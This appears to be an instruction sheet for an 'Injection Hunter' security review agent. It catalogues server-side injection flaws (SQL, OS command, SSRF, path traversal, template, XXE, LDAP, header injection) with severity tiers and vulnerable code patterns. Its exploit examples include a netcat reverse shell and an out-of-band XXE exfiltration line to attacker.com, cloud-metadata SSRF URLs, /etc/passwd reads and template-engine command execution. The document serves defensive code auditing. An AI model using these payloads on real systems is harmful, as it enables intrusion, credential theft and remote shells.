## Agent 1: Injection Hunter — Injection Attack Specialist (server)

Traces paths where external input reaches internal commands, queries, or templates on the server side, and identifies injectable points.

### Check Items

#### 1-1. SQL Injection (SQLi)

- **WHAT**: Locations where user input is embedded into SQL statements via string concatenation
- **WHERE**: ORM `raw()` / `execute()` / `query()` calls, SQL template literals, stored procedure invocations
- **HOW TO EXPLOIT**: `' OR 1=1 --`, UNION-based extraction, blind SQLi (time-based / boolean-based), second-order SQLi (stored values injected into subsequent queries)
- **WHY DANGEROUS**: Extraction, modification, or deletion of all DB data; authentication bypass; in some cases OS command execution (`xp_cmdshell`, `LOAD_FILE`)
- **SEVERITY**:
  - Critical: Unparameterized dynamic SQL where user input directly reaches the query
  - High: ORM raw queries with partial escaping that can be bypassed
  - Medium: Indirect access via stored procedures
  - Low: Input has type constraints making injection difficult (integers only, etc.)

#### 1-2. Command Injection / OS Command Injection

- **WHAT**: Locations where user input is passed to shell commands
- **WHERE**: `child_process.exec()`, `os.system()`, `subprocess.Popen(shell=True)`, backtick execution, `Runtime.exec()`, `system()`, `popen()`
- **HOW TO EXPLOIT**: `; cat /etc/passwd`, `$(whoami)`, `| nc attacker.com 4444 -e /bin/sh`, newline injection, argument injection (`--output=/etc/cron.d/backdoor`)
- **WHY DANGEROUS**: Remote Code Execution (RCE). A direct path to full server compromise
- **SEVERITY**:
  - Critical: User input reaches `exec()` / `system()` with no sanitization
  - High: Input is partially filtered but can be bypassed via alternative characters (`\n`, `\x00`, Unicode normalization)
  - Medium: Argument injection (command itself is fixed but flags can be manipulated)
  - Low: Whitelist validation exists but may be incomplete

#### 1-3. Server-Side Request Forgery (SSRF)

- **WHAT**: Locations where the server fetches a URL / hostname specified by the user
- **WHERE**: HTTP client calls (`fetch`, `requests.get`, `HttpClient`), URL parameters, webhook URL settings, file import (URL-based)
- **HOW TO EXPLOIT**: `http://169.254.169.254/latest/meta-data/` (cloud metadata), `http://localhost:6379/` (internal services), `file:///etc/passwd`, DNS rebinding, URL parser differential bypass (`http://evil.com@localhost/`)
- **WHY DANGEROUS**: Theft of cloud credentials (IAM role credentials), scanning/attacking internal networks, file read access
- **SEVERITY**:
  - Critical: URL constructed directly from user input with no allowlist, in a cloud environment
  - High: URL validation exists but bypassable via DNS rebinding / URL parser differentials
  - Medium: Protocol restriction (http/https only) exists but internal IP addresses are reachable
  - Low: Allowlist exists but regex is incomplete

#### 1-4. Path Traversal / Local File Inclusion (LFI)

- **WHAT**: Locations where user input is used in file paths
- **WHERE**: `fs.readFile()`, `open()`, `include()`, upload destination paths, dynamic template file selection
- **HOW TO EXPLOIT**: `../../../etc/passwd`, `....//....//etc/passwd` (filter bypass), `%2e%2e%2f` (URL encoding), null byte injection (`%00`), Windows UNC paths (`\\attacker\share`)
- **WHY DANGEROUS**: Source code leakage, reading configuration files (`.env`, `config.json`), LFI → RCE (injection into log files + include)
- **SEVERITY**:
  - Critical: User input is used directly in file paths with no `../` filtering
  - High: Filter exists but checks before normalization (bypassable via double encoding)
  - Medium: Chroot / base path restriction exists but escapable via symlinks
  - Low: Whitelist-based approach but list management is incomplete

#### 1-5. Server-Side Template Injection (SSTI)

- **WHAT**: Locations where user input is passed to template engines
- **WHERE**: Jinja2 `render_template_string()`, Twig, Freemarker, Velocity, ERB, Pug/Jade dynamic template generation
- **HOW TO EXPLOIT**: `{{7*7}}` → `49` for detection, `{{config.items()}}` (Jinja2), `${Runtime.getRuntime().exec("id")}` (Freemarker), `#{system("id")}` (ERB)
- **WHY DANGEROUS**: RCE. Full server compromise via template engine sandbox escape
- **SEVERITY**:
  - Critical: Input is interpreted as a template, e.g., `render_template_string(user_input)`
  - High: User input reaches part of the template (variable names, filter names)
  - Medium: Sandbox mode is enabled but known escape techniques exist for the current version
  - Low: Template string is fixed; only data is user input

#### 1-6. XML External Entity (XXE)

- **WHAT**: Locations where the XML parser is configured to resolve external entities
- **WHERE**: XML parsers (`DocumentBuilder`, `SAXParser`, `lxml.etree`, `xml.etree`), SOAP endpoints, SVG uploads, XLSX/DOCX processing
- **HOW TO EXPLOIT**: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`, OOB-XXE (`<!ENTITY xxe SYSTEM "http://attacker.com/?data=...">`), Billion Laughs DoS
- **WHY DANGEROUS**: File read access, SSRF, DoS
- **SEVERITY**:
  - Critical: XML parser with external entities enabled processes user-supplied XML
  - High: DTD processing is enabled (attacks possible via parameter entities)
  - Medium: Parser is restricted but XML arrives via SVG / Office files
  - Low: XML parser configuration is secure but not documented

#### 1-7. LDAP Injection

- **WHAT**: Locations where user input is embedded into LDAP queries via string concatenation
- **WHERE**: LDAP authentication, directory searches, Active Directory integration
- **HOW TO EXPLOIT**: `*)(uid=*))(|(uid=*` to enumerate all users, `*)(userPassword=*)` for attribute extraction
- **WHY DANGEROUS**: Authentication bypass, unauthorized directory information retrieval
- **SEVERITY**:
  - Critical: User input is directly concatenated into LDAP filters with no escaping
  - High: Partial escaping exists but special character handling is incomplete
  - Medium: LDAP library's parameterized API is used but some queries are manually constructed
  - Low: Read-only LDAP bind limits the impact

#### 1-8. Header Injection / HTTP Response Splitting

- **WHAT**: Locations where user input is reflected in HTTP headers
- **WHERE**: `Location` header (redirects), `Set-Cookie`, custom headers, email `To` / `Subject` fields
- **HOW TO EXPLOIT**: Inject `\r\n` to add arbitrary headers, inject response body (HTTP Response Splitting), email header injection (`\nBcc: attacker@evil.com`)
- **WHY DANGEROUS**: XSS (via response body injection), cache poisoning, session fixation, spam email delivery
- **SEVERITY**:
  - Critical: `\r\n` reaches the header unfiltered
  - High: Some frameworks strip CRLF but older versions do so incompletely
  - Medium: Header values are encoded but issues arise under specific proxy configurations
  - Low: Modern frameworks auto-sanitize but custom header processing is unverified

### Language-Agnostic Patterns

An attacker would look for these universal anti-patterns regardless of language:

```
# String concatenation in queries (any language)
"SELECT * FROM users WHERE id = " + userInput
f"SELECT * FROM users WHERE id = {user_id}"
`SELECT * FROM users WHERE id = ${req.params.id}`

# Unsanitized shell execution
exec("convert " + filename)
os.system("ping " + host)
subprocess.run(f"nmap {target}", shell=True)

# URL from user input without allowlist
fetch(req.body.url)
requests.get(user_provided_url)
HttpClient.GetAsync(webhookUrl)

# File path from user input
open(f"uploads/{filename}")
fs.readFile(path.join(uploadDir, req.params.name))

# Template rendering with user input
render_template_string(user_input)
Template(user_input).render()
```

